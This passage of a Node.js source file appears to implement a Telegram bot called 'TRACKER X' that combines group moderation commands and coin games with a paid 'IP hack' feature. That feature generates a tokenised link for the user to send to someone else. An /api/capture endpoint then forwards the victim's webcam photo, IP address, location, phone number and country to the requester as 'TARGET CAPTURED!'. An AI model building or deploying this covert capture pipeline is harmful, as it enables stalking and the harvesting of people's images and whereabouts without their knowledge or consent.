  `, trackingMenu());
  await ctx.answerCbQuery();
});

bot.action("ip_hack", async (ctx) => {
  const user = initUser(ctx.from.id);
  if (user.coins < TRACKING_COST) {
    return ctx.answerCbQuery(`❌ Need ${TRACKING_COST} coins!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, TRACKING_COST, "IP hack");
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "normal",
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), 10 * 60 * 1000);
  
  await safeReply(ctx, `
✅ <b>IP HACK INITIALIZED!</b>

💰 Coins: -${TRACKING_COST}
⏱️ Token expires in 10 minutes

<b>Share this link:</b>
<code>${DOMAIN}?token=${token}</code>
  `, trackingMenu());
  await ctx.answerCbQuery();
});

// ========== COMMANDS ==========
bot.command("warn", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return safeReply(ctx, "❌ Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return safeReply(ctx, "Reply to a user to warn them!");
  
  const warns = (userWarnings.get(`${ctx.chat.id}_${reply.from.id}`) || 0) + 1;
  userWarnings.set(`${ctx.chat.id}_${reply.from.id}`, warns);
  
  await safeReply(ctx, `⚠️ ${reply.from.first_name} warned! (${warns}/3)`);
  
  if (warns >= 3) {
    await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
    userWarnings.delete(`${ctx.chat.id}_${reply.from.id}`);
    await safeReply(ctx, `🚫 ${reply.from.first_name} banned for 3 warnings!`);
  }
});

bot.command("kick", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return safeReply(ctx, "❌ Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return safeReply(ctx, "Reply to a user to kick!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.telegram.unbanChatMember(ctx.chat.id, reply.from.id);
  await safeReply(ctx, `👢 ${reply.from.first_name} kicked!`);
});

bot.command("ban", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return safeReply(ctx, "❌ Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return safeReply(ctx, "Reply to a user to ban!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await safeReply(ctx, `🚫 ${reply.from.first_name} banned!`);
});

bot.command("mute", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return safeReply(ctx, "❌ Admin only!");
  
  const args = ctx.message.text.split(" ");
  const minutes = parseInt(args[1]) || 30;
  const reply = ctx.message.reply_to_message;
  if (!reply) return safeReply(ctx, "Reply to a user to mute!");
  
  const untilDate = Math.floor(Date.now() / 1000) + (minutes * 60);
  
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
      until_date: untilDate,
      can_send_messages: false
    });
    await safeReply(ctx, `🔇 ${reply.from.first_name} muted for ${minutes} minutes!`);
  } catch (err) {
    await safeReply(ctx, "❌ Failed to mute!");
  }
});

bot.command("unmute", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return safeReply(ctx, "❌ Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return safeReply(ctx, "Reply to a user to unmute!");
  
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
      can_send_messages: true
    });
    await safeReply(ctx, `🔊 ${reply.from.first_name} unmuted!`);
  } catch (err) {
    await safeReply(ctx, "❌ Failed to unmute!");
  }
});

bot.command("guess", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const guess = parseInt(args[1]);
  const number = Math.floor(Math.random() * 10) + 1;
  
  if (isNaN(guess) || guess < 1 || guess > 10) {
    return safeReply(ctx, "Guess a number 1-10!");
  }
  if (user.coins < GAME_BET) {
    return safeReply(ctx, `❌ Need ${GAME_BET} coins!`);
  }
  
  removeCoins(ctx.from.id, GAME_BET, "Guess game");
  
  if (guess === number) {
    const winnings = GAME_BET * 5;
    addCoins(ctx.from.id, winnings, "Won guess");
    user.gamesWon++;
    await safeReply(ctx, `🎉 Correct! Number was ${number}!\n💰 +${winnings} coins!`);
  } else {
    await safeReply(ctx, `❌ Wrong! Number was ${number}.\n💸 -${GAME_BET} coin!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

bot.command("rps", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const choice = args[1]?.toLowerCase();
  
  if (!["rock", "paper", "scissors"].includes(choice)) {
    return safeReply(ctx, "Choose rock, paper, or scissors!");
  }
  if (user.coins < GAME_BET) {
    return safeReply(ctx, `❌ Need ${GAME_BET} coins!`);
  }
  
  const botChoice = ["rock", "paper", "scissors"][Math.floor(Math.random() * 3)];
  let result;
  
  if (choice === botChoice) result = "tie";
  else if (
    (choice === "rock" && botChoice === "scissors") ||
    (choice === "paper" && botChoice === "rock") ||
    (choice === "scissors" && botChoice === "paper")
  ) result = "win";
  else result = "lose";
  
  removeCoins(ctx.from.id, GAME_BET, "RPS");
  
  if (result === "win") {
    const winnings = GAME_BET * 2;
    addCoins(ctx.from.id, winnings, "Won RPS");
    user.gamesWon++;
    await safeReply(ctx, `✊ You chose ${choice}, I chose ${botChoice}!\n🎉 WIN! +${winnings} coins!`);
  } else if (result === "lose") {
    await safeReply(ctx, `✊ You chose ${choice}, I chose ${botChoice}!\n💸 LOSE! -${GAME_BET} coin!`);
    user.gamesLost++;
  } else {
    await safeReply(ctx, `✊ You chose ${choice}, I chose ${botChoice}!\n🤝 TIE! Coins returned.`);
    addCoins(ctx.from.id, GAME_BET, "RPS tie");
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

bot.command("balance", async (ctx) => {
  const user = initUser(ctx.from.id);
  await safeReply(ctx, `💰 Balance: ${user.coins} coins`);
});

bot.command("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (user.lastDaily && now - user.lastDaily < dayInMs) {
    const hours = Math.floor((dayInMs - (now - user.lastDaily)) / 3600000);
    return safeReply(ctx, `⏰ Come back in ${hours} hours!`);
  }
  
  let streak = user.dailyStreak || 0;
  if (user.lastDaily && now - user.lastDaily < dayInMs * 2) streak++;
  else streak = 1;
  
  const bonus = Math.min(streak, 10);
  const reward = DAILY_REWARD + bonus;
  addCoins(ctx.from.id, reward, "Daily");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await safeReply(ctx, `🎁 Daily: +${reward} coins!\n🔥 Streak: ${streak} days\n💰 Balance: ${user.coins + reward}`);
});

bot.command("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < 3600000) {
    const minutes = Math.ceil((3600000 - (now - lastWork)) / 60000);
    return safeReply(ctx, `⏰ Rest ${minutes} minutes!`);
  }
  
  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🍕 Delivery"];
  const job = jobs[Math.floor(Math.random() * jobs.length)];
  const reward = Math.floor(Math.random() * (WORK_MAX - WORK_MIN + 1) + WORK_MIN);
  
  addCoins(userId, reward, `Worked as ${job}`);
  userWorkCooldown.set(userId, now);
  await safeReply(ctx, `💼 Worked as ${job}! +${reward} coins!\n💰 Balance: ${users.get(userId).coins}`);
});

bot.command("profile", async (ctx) => {
  const user = initUser(ctx.from.id);
  await safeReply(ctx, `
👤 <b>PROFILE</b>

Name: ${ctx.from.first_name}
ID: <code>${ctx.from.id}</code>

💰 Coins: ${user.coins}
👥 Referrals: ${user.referrals}
🎮 Games: ${user.gamesWon}W / ${user.gamesLost}L
📅 Joined: ${new Date(user.joinDate).toLocaleDateString()}
  `);
});

bot.command("stats", async (ctx) => {
  await safeReply(ctx, `
📊 <b>BOT STATS</b>

👥 Users: ${botStats.totalUsers}
💰 Total Coins: ${botStats.totalCoinsGiven}
🎯 Hacks: ${botStats.totalHacksUsed}
👥 Referrals: ${botStats.totalReferrals}
  `);
});

// ========== ANTI-LINK HANDLER ==========
bot.on("text", async (ctx) => {
  if (!ctx.message || !ctx.message.text) return;
  if (ctx.message.text.startsWith("/")) return;
  
  botStats.totalMessages++;
  
  // Handle user states for welcome/goodbye
  const state = userStates.get(ctx.from.id);
  if (state) {
    if (state.action === "set_welcome") {
      welcomeMessages.set(state.chatId, ctx.message.text);
      await safeReply(ctx, `✅ Welcome message set!\n\n${ctx.message.text}`);
      userStates.delete(ctx.from.id);
    } else if (state.action === "set_goodbye") {
      goodbyeMessages.set(state.chatId, ctx.message.text);
      await safeReply(ctx, `✅ Goodbye message set!\n\n${ctx.message.text}`);
      userStates.delete(ctx.from.id);
    }
    return;
  }
  
  // Anti-link
  if (antilinkGroups.has(ctx.chat.id)) {
    const text = ctx.message.text;
    if (text.includes("http://") || text.includes("https://") || text.includes("t.me/")) {
      await ctx.deleteMessage();
      await safeReply(ctx, `🚫 Links not allowed! ${ctx.from.first_name}`);
      return;
    }
  }
  
  // Anti-spam
  if (antispamGroups.has(ctx.chat.id)) {
    const now = Date.now();
    const userSpam = antispamUsers.get(`${ctx.chat.id}_${ctx.from.id}`) || [];
    const recent = userSpam.filter(t => now - t < 5000);
    
    if (recent.length >= 3) {
      await ctx.telegram.restrictChatMember(ctx.chat.id, ctx.from.id, {
        until_date: Math.floor(now / 1000) + 60,
        can_send_messages: false
      });
      await safeReply(ctx, `🛡️ ${ctx.from.first_name} muted for spamming!`);
      antispamUsers.delete(`${ctx.chat.id}_${ctx.from.id}`);
    } else {
      recent.push(now);
      antispamUsers.set(`${ctx.chat.id}_${ctx.from.id}`, recent);
    }
  }
});

// ========== NEW MEMBER HANDLER ==========
bot.on("new_chat_members", async (ctx) => {
  const welcomeMsg = welcomeMessages.get(ctx.chat.id);
  if (!welcomeMsg) return;
  
  for (const member of ctx.message.new_chat_members) {
    if (member.id === bot.botInfo.id) {
      botStats.totalGroups++;
      continue;
    }
    const text = welcomeMsg.replace("{name}", member.first_name).replace("{group}", ctx.chat.title);
    await safeReply(ctx, text);
  }
});

// ========== LEFT MEMBER HANDLER ==========
bot.on("left_chat_member", async (ctx) => {
  const goodbyeMsg = goodbyeMessages.get(ctx.chat.id);
  if (!goodbyeMsg) return;
  
  const member = ctx.message.left_chat_member;
  if (member.id === bot.botInfo.id) return;
  
  const text = goodbyeMsg.replace("{name}", member.first_name).replace("{group}", ctx.chat.title);
  await safeReply(ctx, text);
});

// ========== API ENDPOINT ==========
app.post("/api/capture", async (req, res) => {
  try {
    const { image, token, ip, location, number, country } = req.body;
    
    if (!token || !activeTokens.has(token)) {
      return res.status(400).json({ error: "Invalid token" });
    }
    
    const tokenData = activeTokens.get(token);
    
    if (image) {
      const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(tokenData.chatId, { source: buffer }, {
        caption: formatMessage(`
📸 TARGET CAPTURED!

📱 Number: ${number || "Unknown"}
🌍 Country: ${country || "Unknown"}
🌐 IP: ${ip || "Unknown"}
📍 Location: ${location || "Unknown"}
🕐 Time: ${new Date().toLocaleString()}
        `),
        parse_mode: "HTML"
      });
    } else {
      await bot.telegram.sendMessage(tokenData.chatId, formatMessage(`
📍 LOCATION TRACKED!

🌐 IP: ${ip || "Unknown"}
📍 Location: ${location || "Unknown"}
📱 Number: ${number || "Unknown"}
🌍 Country: ${country || "Unknown"}
      `), { parse_mode: "HTML" });
    }
    
    activeTokens.delete(token);
    res.json({ status: "success" });
    
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

// ========== SERVE FRONTEND ==========
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

bot.launch().then(() => {
  console.log(`🤖 Bot running!`);
  console.log(`🔱 TRACKER X v${BOT_VERSION} is LIVE!`);
  console.log(`✅ All features working! No crashes!`);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
